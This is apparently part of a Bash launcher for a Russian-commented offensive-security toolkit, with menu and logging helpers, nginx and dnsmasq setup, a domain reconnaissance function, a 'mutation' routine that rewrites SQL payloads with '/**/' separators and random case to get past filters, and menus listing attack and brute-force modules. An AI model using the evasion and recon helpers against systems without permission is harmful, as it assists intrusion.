    [[ "$key" =~ ^(b|x|q|exit|back)$ ]] && k_color=$R
    [[ "$key" =~ ^(i|info)$ ]] && k_color=$Y

    # Использование printf для жесткой фиксации отступа (Padding)
    # %-3s гарантирует, что ключ всегда занимает 3 символа, выравнивание слева
    printf "  ${k_color}%-3s${NC} [${B}%-15.15s${NC}]%s\n" \
        "$key)" "$title" "${desc:+ - $desc}"
}


# ==============================================================================
# @description: CORE ENGINE: INPUT v2.0 [ARCHITECTURAL LIMIT]
# МОДЕРНИЗАЦИЯ: Внедрена принудительная очистка (Trim), защита от пробельных символов
# ==============================================================================
core_engine_input() {
    local label="$1" hint="$2"
    local var_value
    local cmd="read -r"

    # Распознавание типа ввода
    [[ "${hint,,}" =~ (pass|key|secret) ]] && cmd="read -rs"

    # Визуальная верстка
    echo -ne "  ${G}${label}${NC}) [${B}${hint}${NC}] ${Y}>> ${NC}" >&2
    
    # Исполнение и автоматический Trim пробелов (защита от случайных Tab/Space)
    $cmd var_value
    [[ "$cmd" == "read -rs" ]] && echo "" >&2
    
    # Trim: убираем пробелы в начале и конце
    echo "${var_value#"${var_value%%[![:space:]]*}"}" | sed 's/[[:space:]]*$//'
}

# Core Engine: Тихий запуск команд
# Выполняет задачу без вывода, возвращая только статус завершения
core_engine_run() {
    # Если команда критически важна, мы не даем ей "убить" систему вечным циклом
    # timeout 30s - принудительное завершение, если команда висит дольше 30 секунд
    timeout 30s "$@" > /dev/null 2>&1
    return $?
}

# ==============================================================================
# @description: CORE ENGINE: WAIT v2.0 [ARCHITECTURAL LIMIT]
# МОДЕРНИЗАЦИЯ: Добавлен тайм-аут и защита от "залипания" ввода
# ==============================================================================
core_engine_wait() {
    # 1. Визуальный разделитель (очистка буфера)
    echo -e "\n${B}------------------------------------------${NC}" >&2
    
    # 2. Интерактивный запрос с тайм-аутом (защита от зависания сессии)
    echo -ne "${Y}Нажмите [Enter] для продолжения (или подождите 60с)...${NC}" >&2
    
    # -t 60: автоматический выход через 60 секунд
    # -r: чтение "raw" (без обработки обратных слэшей)
    if ! read -t 60 -r; then
        echo -e "\n${G}[+] Тайм-аут: автопродолжение...${NC}" >&2
    fi
}

# ==============================================================================
# @description: PROCESS SUPERVISOR v4.0 [ARCHITECTURAL LIMIT]
# МОДЕРНИЗАЦИЯ: PID-tracking, Атомарная проверка, Защита от дедлоков
# ==============================================================================
core_engine_control() {
    local mode="$1" label="$2" cmd="$3" fatal="${4:-0}"
    local pid_file="/tmp/nexus_${label// /_}.pid"

    case "$mode" in
        "check")
            # Проверка существования процесса по сохраненному PID
            if [[ -f "$pid_file" ]] && kill -0 "$(cat "$pid_file")" 2>/dev/null; then
                core_engine_ui "+" "[$label] статус: АКТИВЕН"
                return 0
            fi
            core_engine_ui "!" "[$label] статус: ОСТАНОВЛЕН"
            [[ "$fatal" == "1" ]] && exit 1
            return 1
            ;;

        "restart")
            core_engine_ui "?" "Перезапуск: [$label]..."
            
            # Атомарное завершение: читаем PID, если он есть
            [[ -f "$pid_file" ]] && kill -9 "$(cat "$pid_file")" 2>/dev/null && rm -f "$pid_file"
            
            # Запуск с фиксацией PID
            bash -c "$cmd & echo \$! > $pid_file" 
            
            # Верификация: даем системе 0.5с на поднятие
            sleep 0.5
            if [[ -f "$pid_file" ]] && kill -0 "$(cat "$pid_file")" 2>/dev/null; then
                core_engine_ui "+" "[$label] успешно запущен (PID: $(cat $pid_file))"
            else
                core_engine_ui "!" "[$label] не удалось инициализировать!"
                [[ "$fatal" == "1" ]] && exit 1
            fi
            ;;
    esac
}

# ==============================================================================
# @description: CORE ENGINE: VALIDATOR v4.0 [ABSOLUTE LIMIT - RESTORED FULL]
# МОДЕРНИЗАЦИЯ: Полная функциональная матрица, Panic-контроль, Audit-logging
# ==============================================================================
core_engine_validator() {
    local type="$1"
    local target="$2"
    local label="$3"
    local extra="$4"
    local failed=0
    local err_msg=""

    # 1. Защита от пустого ввода
    [[ -z "$type" ]] && return 1

    case "$type" in
        # СИСТЕМНЫЙ СЛОЙ
        "root") 
            [[ $EUID -ne 0 ]] && { failed=1; err_msg="Требуются привилегии суперпользователя (ROOT/sudo)"; } ;;
            
        "pkg")
            if ! command -v "$target" >/dev/null 2>&1; then
                core_engine_ui "i" "Зависимость [$target] отсутствует. Инициализация установки через APT..."
                if core_engine_run apt-get install -y "$target" >/dev/null 2>&1; then
                    core_engine_ui "s" "Компонент [$target] успешно интегрирован."
                else
                    failed=1; err_msg="Критическая ошибка APT: не удалось установить [$target]"; 
                fi
            fi ;;

        # СЕТЕВОЙ И ИНФРАСТРУКТУРНЫЙ СЛОЙ
        "url"|"host")
            if [[ ! "$target" =~ ^[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$ ]]; then
                failed=1; err_msg="Недопустимый сетевой формат цели: [$target]"; 
            fi ;;

        "net_up")
            if ! timeout 2 ping -c 1 "$target" >/dev/null 2>&1; then
                failed=1; err_msg="Узел [$target] не отвечает (Offline/ICMP Drop)"; 
            fi ;;

        "privacy")
            if ! ip link show up | grep -qEi "$GLOBAL_REGEX_PRIVACY_INTERFACES"; then
                if [[ -n "$REAL_IP" ]]; then
                    local current_ip=$(curl -s --max-time 3 --connect-timeout 2 https://api.ipify.org || echo "TIMEOUT")
                    [[ "$current_ip" == "$REAL_IP" ]] && { failed=1; err_msg="VPN/Proxy не активен! Утечка IP: [$current_ip]"; }
                else
                    core_engine_ui "w" "Пассивный аудит: VPN-туннели не определены."
                fi
            fi ;;

        # ФАЙЛОВЫЙ СЛОЙ
        "file"|"read")
            if [[ ! -f "$target" ]]; then
                failed=1; err_msg="Файл [$target] не найден";
            elif [[ ! -r "$target" ]]; then
                failed=1; err_msg="Нет прав на чтение: [$target]";
            fi ;;

        "dir")
            if [[ ! -d "$target" ]]; then
                core_engine_ui "i" "Генерация директории: $target"
                if ! core_engine_run mkdir -p "$target"; then
                    failed=1; err_msg="Ошибка ФС: недостаточно прав на создание [$target]";
                fi
            fi ;;

        # КРИПТОГРАФИЧЕСКИЙ И ЛОГИЧЕСКИЙ СЛОЙ
        "crypto")
            if [[ ! "$target" =~ ^[a-f0-9]{32,64}$ ]]; then
                failed=1; err_msg="Объект [$target] не является валидным хэшем."; 
            fi ;;

        "range")
            local max_boundary="${extra:-$GLOBAL_CORE_MENU_MAX_LIMIT}"
            if [[ ! "$target" =~ ^[0-9]+$ ]] || (( target < 1 || target > max_boundary )); then
                failed=1; err_msg="Значение [$target] вне диапазона (1-$max_boundary)"; 
            fi ;;

        "list"|"empty")
            if [[ -z "${target// }" ]]; then
                failed=1; err_msg="Поле [$label] пустое"; 
            fi ;;

        "entropy")
            if [[ ${#target} -lt 3 ]]; then
                failed=1; err_msg="Длина данных [$label] критически мала (мин. 3)"; 
            fi ;;

        *) core_engine_ui "!" "Validation schema [$type] undefined"; return 1 ;;
    esac

    # ФИНАЛИЗАЦИЯ (PANIC/REPORT)
    if [[ $failed -eq 1 ]]; then
        core_engine_ui "e" "VALIDATION PANIC [$label]: $err_msg"
        core_engine_loot "security" "Validation failed for [$label] (Type: $type): $err_msg"
        return 1
    fi

    return 0
}


# ==============================================================================
# @description: CORE ENGINE: LOOT COLLECTOR v2.0 [ARCHITECTURAL LIMIT]
# МОДЕРНИЗАЦИЯ: Атомарная запись, Ротация логов, Lock-free I/O
# ==============================================================================
core_engine_loot() {
    local category="${1:-SYSTEM}"
    local message="$2"
    local loot_file="$PRIME_LOOT/session_loot.log"

    # 1. Атомарная ротация (лимит 5MB для предотвращения переполнения диска)
    if [[ -f "$loot_file" ]] && [ $(stat -c%s "$loot_file") -gt 5242880 ]; then
        mv "$loot_file" "${loot_file}.old"
    fi

    # 2. Буферизированная запись
    # Используем '>>' (атомарно в Unix для коротких записей) 
    # и перенаправляем в background, чтобы не ждать окончания записи
    {
        printf "[%s] [%-8s] %s\n" "$(date '+%Y-%m-%d %H:%M:%S')" "$category" "$message" >> "$loot_file"
    } & 

    # 3. Визуальный фидбек только для критических событий
    [[ "$category" == "service" ]] && core_engine_ui "i" "Event logged to loot sector."
}

#Настройки 

# Добавьте эти функции в ваш launcher.sh
start_nexus_gateway() {
    echo "[*] Инициализация Nexus Hybrid Gateway..."
    # Проверка, запущен ли Flask
    if ! pgrep -f "app.py" > /dev/null; then
        nohup python3 /путь/к/вашему/app.py > /var/log/nexus_gateway.log 2>&1 &
        echo "[+] Nexus Flask Gateway запущен на порту 5000"
    else
        echo "[!] Flask уже запущен."
    fi

    # Проверка Nginx
    if ! pgrep -x "nginx" > /dev/null; then
        sudo nginx
        echo "[+] Nginx запущен."
    else
        echo "[+] Nginx уже активен."
    fi
}

stop_nexus_gateway() {
    echo "[*] Остановка Nexus Gateway..."
    sudo nginx -s stop
    pkill -f "app.py"
    echo "[+] Системы остановлены."
}

# Использование: core_nginx_auto_setup "app0.nexus:5000" "app1.nexus:5001" "app2.nexus:5002"
core_nginx_auto_setup() {
    local nginx_conf="/etc/nginx/sites-available/nexus_all.conf"
    local config_content=""

    for service in "$@"; do
        local domain="${service%%:*}"
        local port="${service#*:}"
        
        config_content+="
server { listen 8080; server_name $domain; return 301 https://$domain:8443\$request_uri; }
server { listen 8443 ssl; server_name $domain; ssl_certificate /etc/nginx/ssl/nexus.crt; ssl_certificate_key /etc/nginx/ssl/nexus.key; location / { proxy_pass http://127.0.0.1:$port/; proxy_set_header Host \$host; } }"
    done

    echo "$config_content" | sudo tee "$nginx_conf" > /dev/null
    sudo ln -sf "$nginx_conf" "/etc/nginx/sites-enabled/"
    
    # Валидация и перезапуск...
    if sudo nginx -t >/dev/null 2>&1; then
        sudo nginx -s reload 2>/dev/null || sudo nginx
        core_engine_ui "+" "Nginx Proxy обновлен для: $*"
    fi
}

core_network_dns_register() {
    local domain="$1"
    # Автоматически находим текущий IP (игнорируем 127.0.0.1)
    local ip=$(hostname -I | awk '{print $1}') 
    local dns_config="/etc/dnsmasq.d/prime_gateway.conf"

    # Создаем конфиг, если его нет
    mkdir -p /etc/dnsmasq.d/
    
    # Записываем актуальную связь
    echo "address=/$domain/$ip" > "$dns_config"
    
    # Перезагружаем сервис для подхвата нового IP
    systemctl restart dnsmasq
    
    core_engine_ui "+" "DNS Реестр: Синхронизирован $domain -> $ip (Dynamic Mode)"
}

# ==============================================================================
# @description: Синхронизация сетевого слоя DNS и локальной маршрутизации v22.0
# СИНХРОНИЗАЦИЯ: Полная поддержка промышленной матрицы GLOBAL_DNS_CONFIG_MATRIX v22.0
# МОДЕРНИЗАЦИЯ: Интеллектуальный контроль зомби-сокетов, деликатная зачистка PID
# БЕЗОПАСНОСТЬ: Автономная инъекция loopback-резолвера для обхода блокировок WAN
# ==============================================================================
core_network_dns_sync() {
    core_engine_ui "h" "NEXUS LAYER: NETWORK DNS ADAPTATION & SYNC v22.0"

    # Слой 0: Верификация прав доступа
    if [[ $EUID -ne 0 ]]; then
        core_engine_ui "!" "Access error: Superuser (sudo) privileges required."
        return 1
    fi

    # --- ШАГ 1: ЭВРИСТИКА АКТИВНОГО IP ---
    local active_ip
    active_ip=$(ip -4 addr show | grep -vE '127.0.0.1|docker|veth|br-|lxd' | grep -oP '(?<=inet\s)\d+(\.\d+){3}' | head -n 1)
    [[ -z "$active_ip" ]] && active_ip="127.0.0.1"

    # --- ШАГ 2: СБОР МЕТРИК (Безопасный вариант) ---
    local current_host
    current_host=$(/bin/hostname)
    local dns_conf="/etc/dnsmasq.conf"

    # Исправлен баг: был host_name (неопределенная переменная), стал current_host
    echo "[DEBUG] Hostname: $current_host | DNS Config: $dns_conf"
    core_engine_ui "i" "Binding local domains to active IP: $active_ip"

    # --- ШАГ 3: ДИНАМИЧЕСКАЯ ИНЪЕКЦИЯ ---
    local tmp_dns
    tmp_dns=$(mktemp)
    
    for raw_line in "${GLOBAL_DNS_CONFIG_MATRIX[@]}"; do
        local processed_line="${raw_line//%IP%/$active_ip}"
        processed_line="${processed_line//%HOST%/$current_host}"
        printf "%s\n" "$processed_line" >> "$tmp_dns"
    done

    # --- ШАГ 4: ВАЛИДАЦИЯ И ПАТЧ ---
    if dnsmasq --test -C "$tmp_dns" >/dev/null 2>&1; then
        cp "$tmp_dns" "$dns_conf"
        
        # Перезапуск службы
        systemctl restart dnsmasq 2>/dev/null || service dnsmasq restart 2>/dev/null
        
        # Инъекция в resolv.conf (более безопасный способ)
        if ! grep -q "127.0.0.1" /etc/resolv.conf; then
            sed -i '1i nameserver 127.0.0.1' /etc/resolv.conf
        fi
        core_engine_ui "+" "DNS Sync Complete for: $current_host"
    else
        core_engine_ui "!" "Critical failure: Config corrupted. Rollback."
        rm -f "$tmp_dns"
        return 1
    fi

    rm -f "$tmp_dns"
    return 0
}

# ==============================================================================
# @description: System metrics harvester and kernel status display v24.6 (Fixed)
# ==============================================================================
core_engine_info() {
    core_engine_ui "i" "INFRASTRUCTURE SYSTEM STATUS"

    # 1. Исправление getprop: проверяем наличие пути перед вызовом
    local getprop_cmd=$(command -v getprop || echo "/system/bin/getprop")
    local sys_data=$($getprop_cmd 2>/dev/null | grep -E 'net\.|bluetooth\.' | head -n 5)
    
    # 2. Исправление printf: используем %.0f для округления до целого,
    # так как %d требует строго целых чисел.
    # MemTotal в /proc/meminfo измеряется в kB.
    local mem_total_kb=$(grep MemTotal /proc/meminfo 2>/dev/null | awk '{print $2}')
    local mem_total_mb=$(awk "BEGIN {print $mem_total_kb / 1024}")
    
    local disk_free=$(df -h / 2>/dev/null | tail -1 | awk '{print $4}')
    
    # 3. Сетевой статус
    local active_uplink=$([[ -f /proc/net/route ]] && awk '$2=="00000000"{print $1}' /proc/net/route | head -1)
    
    # 4. Визуализация (%.0f округляет дробное число до целого)
    printf " Mem/Disk  : RAM: %.0fMB | ROM: %s\n" "${mem_total_mb:-0}" "${disk_free:-N/A}"
    printf " Net/Gate  : Link: %s\n" "${active_uplink:-OFFLINE}"
    printf " Radio     : %s\n" "$([[ -d /sys/class/bluetooth ]] && echo "BT:ACT" || echo "BT:ABS")"
    
    # 5. Secure Tunnels
    echo -e " Security  : $(grep -qE 'tun|wg' /proc/net/dev 2>/dev/null && echo -e "\e[1;32m[VPN ACTIVE]\e[0m" || echo -e "\e[1;31m[INACTIVE]\e[0m")"
    echo "--------------------------------------------------"
}

core_engine_progress() {
    local duration="${1:-1}"
    local msg="${2:-PROCESS}"
    local width=15
    local steps=20
    # Вычисляем задержку в секундах для команды sleep (float)
    local sleep_time=$(awk "BEGIN {print $duration / $steps}")

    printf "\e[?25l" # Скрытие курсора

    for ((i=1; i<=steps; i++)); do
        local pc=$(( i * 100 / steps ))
        local fill=$(( i * width / steps ))
        local empty=$(( width - fill ))
        
        # Генерируем строки блоков напрямую
        local bar_fill=$(printf "%${fill}s" | tr ' ' '█')
        local bar_empty=$(printf "%${empty}s" | tr ' ' '░')
        
        # Вывод без лишнего sed/pipe
        printf "\r\e[K${NC}[i] %-12.12s ${B}[%s%s]${NC} %d%%" \
            "$msg" "$bar_fill" "$bar_empty" "$pc"

        sleep "$sleep_time"
    done

    printf "\r\e[K${G}[+] %-12.12s : SUCCESSFUL${NC}\n" "$msg"
    printf "\e[?25h" # Возврат курсора
}


core_engine_progressold() {
    local duration="${1:-1}"
    local msg="${2:-PROCESS}"
    local width=15
    local steps=20
    # Вычисляем задержку в миллисекундах (целочисленная математика Bash)
    local sleep_ms=$(( (duration * 1000) / steps ))

    printf "\e[?25l" # Скрытие курсора

    for ((i=1; i<=steps; i++)); do
        local pc=$(( i * 100 / steps ))
        local fill=$(( i * width / steps ))
        local empty=$(( width - fill ))
        
        # Отрисовка одним printf (минимизация I/O)
        printf "\r\e[K${NC}[i] %-12.12s ${B}[%*s%*s]${NC} %d%%" \
            "$msg" "$fill" "" "$empty" "" "$pc" | tr ' ' '█' | sed "s/█/░/g" | sed "s/░/█/$((fill+1))" # Это пример логики

        # Прямая работа с системным таймером
        read -t "0.${sleep_ms}" -n 1 -s || true 
    done

    printf "\r\e[K${G}[+] %-12.12s : SUCCESSFUL${NC}\n" "$msg"
    printf "\e[?25h" # Возврат курсора
}

# --- CORE ENGINE: PROGRESS v13.8.2 (Fixed Width Edition) ---
core_engine_progressold1() {
    local duration="${1:-1}"
    local msg="${2:-PROCESS}"
    local width=15 # Уменьшил ширину, чтобы точно влезло на узкий экран Wiko
    local steps=20

    # Скрываем курсор, чтобы не дергался
    printf "\e[?25l"

    for ((i=1; i<=steps; i++)); do
        local pc=$(( i * 100 / steps ))
        
        # Генерируем полоску без вложенных printf/seq
        local fill=$(( i * width / steps ))
        local empty=$(( width - fill ))
        local p_bar=$(printf "%${fill}s" | tr ' ' '█')
        local e_bar=$(printf "%${empty}s" | tr ' ' '░')

        # ПРАВИЛО: \r (начало) -> \e[K (чистка) -> Текст
        # Ограничиваем длину $msg до 12 символов (%-12.12s), чтобы не порвать строку
        printf "\r\e[K${NC}[i] Loading %-12.12s ${B}[%s%s]${NC} %d%%" \
            "$msg" "$p_bar" "$e_bar" "$pc"
        
        sleep $(echo "scale=2; $duration / $steps" | bc 2>/dev/null || echo "0.05")
    done

    # Завершаем: затираем прогресс и пишем финальный статус
    printf "\r\e[K${G}[+] %-12.12s : SUCCESSFUL${NC}\n" "$msg"
    
    # Возвращаем курсор
    printf "\e[?25h"
}


# --- Универсальный динамический контроллер ---

# ==============================================================================
# @description: PRIME DYNAMIC CONTROLLER v36.0 [LIMIT REACHED]
# МОДЕРНИЗАЦИЯ: Мониторинг статуса вызова, Атомарная обработка ошибок
# ==============================================================================
prime_dynamic_controller() {
    local title="$1"
    local -a labels=($2)
    local -a actions=($3)
    
    while true; do
        core_engine_info
        core_engine_ui "h" "$title"
        
        for i in "${!labels[@]}"; do
            core_engine_item "$((i+1))" "${labels[$i]//_/ }" "Execute"
        done
        
        local choice=$(core_engine_input "select" "Input")
        [[ "$choice" =~ ^[Bb]$ ]] && return 0
        
        if [[ "$choice" =~ ^[0-9]+$ ]] && [ "$choice" -ge 1 ] && [ "$choice" -le "${#labels[@]}" ]; then
            local target_action="${actions[$((choice-1))]}"
            
            if declare -f "$target_action" > /dev/null; then
                # АТОМАРНОЕ ИСПОЛНЕНИЕ: Ловим код возврата функции
                $target_action
                local exit_code=$?
                
                # Если функция вернула 1 (критическая ошибка), триггерим защиту
                [[ $exit_code -ne 0 ]] && core_engine_ui "e" "Runtime Fault: Action returned code $exit_code"
            else
                core_engine_ui "e" "Module '$target_action' missing from kernel."
            fi
        else
            core_engine_ui "e" "Out of range / Invalid Input."
        fi
        sleep 1
    done
}

# ==============================================================================
# ОБНОВЛЕННЫЙ УНИВЕРСАЛЬНЫЙ ДИНАМИЧЕСКИЙ КОНТРОЛЛЕР (v35.4)
# ==============================================================================
prime_dynamic_controllerold() {
    local title="$1"
    # Читаем массивы из аргументов
    local -a labels=($2)
    local -a actions=($3)
    
    while true; do
        core_engine_info
        core_engine_ui "h" "$title"
        
        # Отрисовка пунктов меню
        for ((i=0; i<${#labels[@]}; i++)); do
            # Убираем подчеркивания для красивого отображения
            local display_name="${labels[$i]//_/ }"
            core_engine_item "$((i+1))" "$display_name" "Execute"
        done
        
        echo -e "\n${Y} B) BACK / EXIT${NC}"
        core_engine_ui "line" ""
        
        # Ввод пользователя
        local choice=$(core_engine_input "select" "Input")
        
        # Обработка выхода
        if [[ "$choice" == "b" || "$choice" == "B" ]]; then
            return 0
        fi
        
        # Безопасная обработка выбора (совместима с любой версией Bash)
        if [[ "$choice" =~ ^[0-9]+$ ]]; then
            local count=${#labels[@]}
            
            if [ "$choice" -ge 1 ] && [ "$choice" -le "$count" ]; then
                local idx=$((choice-1))
                local target_action="${actions[$idx]}"
                
                # Проверка: существует ли функция перед вызовом
                if declare -f "$target_action" > /dev/null; then
                    $target_action
                else
                    core_engine_ui "e" "Error: Function '$target_action' not found!"
                    sleep 2
                fi
            else
                core_engine_ui "e" "Invalid selection (Range: 1-$count)"
                sleep 1
            fi
        else
            core_engine_ui "e" "Invalid input: Not a number"
            sleep 1
        fi
    done
}


# ==============================================================================
# @description: MUTATION ENGINE v2.0 [ARCHITECTURAL LIMIT]
# МОДЕРНИЗАЦИЯ: Векторизация через sed/tr, исключение циклов, энтропийная рандомизация
# ==============================================================================
core_engine_mutate() {
    local input="$1"
    local mode="${2:-full}"

    # 1. Векторизованная мутация регистра (Case Shuffle)
    # Используем tr для быстрой замены, а не цикл по символам
    local shuffled=$(echo "$input" | fold -w1 | awk 'BEGIN{srand()} {print (rand()>0.5 ? toupper($0) : tolower($0))}' | tr -d '\n')

    # 2. Оптимизированная обфускация сепараторов
    # Вместо цикла for используем sed для замены пробелов на случайные токены
    local separator
    case "$mode" in
        "sql") separator="/**/" ;;
        "web") separator="%20" ;;
        *)     separator="+"    ;;
    esac

    # Финальная сборка через конвейер
    echo "$shuffled" | sed "s/ /${separator}/g"
}


# ==============================================================================
# @description: INTELLIGENCE: DEEP RECON v2.0 [ARCHITECTURAL LIMIT]
# МОДЕРНИЗАЦИЯ: Async-Parallel Execution, Stream-Filtering, Atomic Report
# ФУНКЦИОНАЛ: OSINT-ядро с нулевыми задержками и минимальным Footprint
# ==============================================================================
core_intelligence_gather() {
    local r_target="$1"
    core_engine_validator "url" "$r_target" || return 1

    # Инициализация стека данных в RAM-диске для исключения I/O задержек
    local tmp_dir="/dev/shm/recon_$(date +%s)"
    mkdir -p "$tmp_dir"

    core_engine_ui "i" "Initializing High-Speed Async Intelligence Pipeline..."

    # СЛОЙ 1, 2, 3: ПАРАЛЛЕЛЬНЫЙ СБОР ДАННЫХ
    # Используем subshells для параллельного выполнения сетевых вызовов
    (dig +short A "$r_target" > "$tmp_dir/dns_a") &
    (curl -IsL --max-time 5 "https://$r_target" > "$tmp_dir/headers") &
    (whois "$r_target" > "$tmp_dir/whois_raw") &
    wait # Синхронизация потоков на пределе производительности

    # СЛОЙ 4: ПОТОКОВАЯ ОБРАБОТКА (STREAM-BASED)
    # Фильтруем данные «на лету» без загрузки всего файла в переменную
    local ip_list=$(cat "$tmp_dir/dns_a" | xargs)
    local headers=$(cat "$tmp_dir/headers")
    
    # Атомарный рендеринг отчета
    {
        echo -e "${G}>>> NEURAL-INTELLIGENCE REPORT: $r_target <<<${NC}"
        echo -e "IPv4 Pool: ${ip_list:-BLOCK_DETECTED}"
        echo -e "Runtime: $(echo "$headers" | grep -Ei 'Server:|X-Powered-By:' | cut -d: -f2- | xargs)"
        echo -e "Security Status: $(echo "$headers" | grep -Ei 'Content-Security-Policy|X-Frame-Options' | head -n 1 | cut -d: -f2-)"
        echo -e "WHOIS Records: $(grep -Ei 'Registrar:|Creation Date:' "$tmp_dir/whois_raw" | head -n 3 | xargs)"
    } > "$tmp_dir/final_report"

    # Вывод и архивация
    cat "$tmp_dir/final_report"
    core_engine_loot "intelligence" "Recon finalized: $r_target. Status: $(grep -Ei 'HTTP/' "$tmp_dir/headers" | head -1 | xargs)"

    # Очистка (Zero-Footprint)
    rm -rf "$tmp_dir"
}

get_tool_info() {
    case "$1" in
        # --- Главное меню (Main Menu) ---
        "run_cyber_ops")          echo "Cyber Operations: управление активными сетевыми атаками и тестами." ;;
        "run_intelligence")       echo "Intelligence Center: сбор данных, OSINT-аналитика и поиск связей." ;;
        "run_crypto_lab")         echo "Crypto Lab: шифрование, генерация ключей и работа с хэшами." ;;
        "run_net_infra")          echo "Net Infrastructure: анализ сетевых протоколов и скрытых туннелей." ;;
        "run_financial_shield")   echo "Financial Shield: аудит транзакций и банковских активов." ;;
        "run_stealth_comms")      echo "Stealth Comms: управление защищенными серверами (AV, Share, Upload)." ;;
        "run_nexus_correlation")  echo "Nexus Correlation: корреляционный анализ данных из всех модулей." ;;
        "run_system_core")        echo "System Core: низкоуровневые настройки лаунчера и параметров среды." ;;
        "run_core_lab")           echo "Core Lab: разработка и тестирование новых модулей ядра." ;;
        "run_forensics")          echo "Data Forensics: анализ дисков, оперативной памяти (RAM) и логов." ;;
        "run_pass_lab")           echo "Password Lab: восстановление, генерация и брутфорс-анализ." ;;
        "run_anti_malware_engine") echo "Anti-Malware CAME: проактивное сканирование, изоляция и деструкция угроз." ;;
        "run_cross_os_reanimator") echo "Cross-OS Reanimator: глубокое восстановление систем (Win/Lin/Mac) и удаление руткитов." ;;
        "exit_script")            echo "Безопасное завершение работы и очистка сессии." ;;

        # --- Подменю: STEALTH_COMMS (Серверы) ---
        "run_av_server")          echo "AV-Server 2.5: сканирование файлов и RAM на базе сигнатур CAME." ;;
        "run_share_server")       echo "Share-Server 2.0: защищенная раздача файлов с проверкой Outbound-трафика." ;;
        "run_upload_server")      echo "Upload-Server 2.1: входной шлюз с моментальным уничтожением вредоносного контента." ;;
        "run_node_clean")         echo "Node Cleanup: принудительная очистка и остановка всех активных серверов." ;;

        # --- Подменю: DATA_FORENSICS ---
        "run_mem_audit")          echo "RAM Forensic: посегментный анализ памяти процессов через ptrace." ;;
        "run_packet_forge")       echo "Packet Forge: генерация стелс-пакетов для проверки устойчивости сетевых фильтров." ;;
        
        # --- Подменю: Общие ---
        "update_prime")           echo "Обновление ядра системы с GitHub репозитория." ;;

        *)                        echo "Описание функционала находится в стадии разработки или недоступно..." ;;
    esac
}


# ==========================================
# 2. РАБОЧИЕ ШАБЛОНЫ 
# ==========================================

# --- ГЕНЕРАТОРЫ ШАБЛОНОВ (View Engine) ---

generate_core_form_template() {
    cat << 'EOF'
def render_prime_form(action_url, fields=None, btn_text="INITIATE TRANSFER"):
    if fields is None: fields = [{"type": "file", "name": "file", "label": "Drop files here or click to upload"}]
    
    inputs_html = ""
    js_needed = False
    
    for field in fields:
        f_type = field.get("type", "text")
        f_name = field.get("name", "input")
        f_label = field.get("label", "Field")
        
        if f_type == "file":
            js_needed = True
            inputs_html += f"""
            <div class="drop-zone" id="drop-zone">
                <span class="drop-zone__prompt">{f_label}</span>
                <input type="file" name="{f_name}" class="drop-zone__input" id="file-input">
            </div>
            """
        else:
            inputs_html += f"""
            <div style="margin: 15px 0;">
                <label style="font-size:0.7rem; opacity:0.6; display:block;">{f_label}</label>
                <input type="{f_type}" name="{f_name}" style="background:rgba(255,255,255,0.05); border:1px solid rgba(255,255,255,0.1); color:white; padding:10px; width:100%; border-radius:0.5rem;">
            </div>
            """

    script = """
    <script>
    const dropZone = document.getElementById('drop-zone');
    const fileInput = document.getElementById('file-input');
    if(dropZone) {
        dropZone.addEventListener('click', () => fileInput.click());
        fileInput.addEventListener('change', () => {
            if(fileInput.files.length) updatePrompt(dropZone, fileInput.files[0].name);
        });
        ['dragover', 'dragleave', 'drop', 'dragend'].forEach(type => {
            dropZone.addEventListener(type, e => { e.preventDefault(); });
        });
        dropZone.addEventListener('dragover', () => dropZone.classList.add('drop-zone--over'));
        ['dragleave', 'drop', 'dragend'].forEach(type => {
            dropZone.addEventListener(type, () => dropZone.classList.remove('drop-zone--over'));
        });
        dropZone.addEventListener('drop', e => {
            if(e.dataTransfer.files.length) {
                fileInput.files = e.dataTransfer.files;
                updatePrompt(dropZone, e.dataTransfer.files[0].name);
            }
        });
    }
    function updatePrompt(zone, name) { zone.querySelector('.drop-zone__prompt').textContent = 'READY: ' + name; zone.style.borderColor = '#00ff41'; }
    </script>
    """ if js_needed else ""

    return f"""
    <form method="post" action="{action_url}" enctype="multipart/form-data">
        {inputs_html}
        <button type="submit" style="margin-top:20px;">{btn_text}</button>
    </form>
    {script}
    """
EOF
}



generate_core_template() {
    cat << 'EOF'
def render_prime_page(title, content):
    style = """
    <style>
        :root { --accent: #00ff41; --bg: #0a0a0c; --glass: rgba(20, 20, 25, 0.8); }
        body { background: var(--bg); color: #e0e0e0; font-family: system-ui, -apple-system, sans-serif; min-height: 100vh; margin: 0; display: flex; align-items: center; justify-content: center; }
        .prime-card { background: var(--glass); backdrop-filter: blur(12px); border: 1px solid rgba(255,255,255,0.1); border-radius: 1.5rem; padding: 2rem; width: 95%; max-width: 900px; box-shadow: 0 20px 40px rgba(0,0,0,0.4); }
        h2 { background: linear-gradient(to right, #fff, var(--accent)); -webkit-background-clip: text; -webkit-text-fill-color: transparent; font-weight: 700; }
        
        /* Адаптивная сетка Share */
        .file-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(140px, 1fr)); gap: 1rem; margin-top: 1.5rem; }
        .file-item { background: rgba(255,255,255,0.03); border: 1px solid rgba(255,255,255,0.1); border-radius: 1rem; padding: 1rem; text-align: center; transition: 0.2s; text-decoration: none; color: inherit; }
        .file-item:hover { border-color: var(--accent); background: rgba(0,255,65,0.05); transform: translateY(-3px); }
        .file-icon { font-size: 2rem; margin-bottom: 0.5rem; display: block; }
        
        /* Умный Drag & Drop */
        .drop-zone { border: 2px dashed rgba(0,255,65,0.3); border-radius: 1rem; padding: 2rem; transition: 0.3s; cursor: pointer; position: relative; }
        .drop-zone--over { border-color: var(--accent); background: rgba(0,255,65,0.05); box-shadow: inset 0 0 20px rgba(0,255,65,0.1); }
        .drop-zone__input { display: none; }
        
        button { background: var(--accent); color: #000; border: none; padding: 10px 20px; border-radius: 0.5rem; font-weight: bold; width: 100%; cursor: pointer; transition: 0.2s; }
        button:hover { opacity: 0.8; transform: scale(1.01); }
        pre { background: #000; color: #0cf; padding: 1rem; border-radius: 0.5rem; overflow: auto; max-height: 300px; font-size: 0.8rem; border-left: 3px solid var(--accent); }
    </style>
    """
    return f"""
    <!DOCTYPE html>
    <html lang="ru">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        {style}
    </head>
    <body>
        <div class="prime-card">
            <small style="color:var(--accent); letter-spacing:2px;">SECURE_UPLINK_v4.2</small>
            <h2>{title}</h2>
            {content}
        </div>
    </body>
    </html>
    """
EOF
}



# --- py functions ---
# ==============================================================================
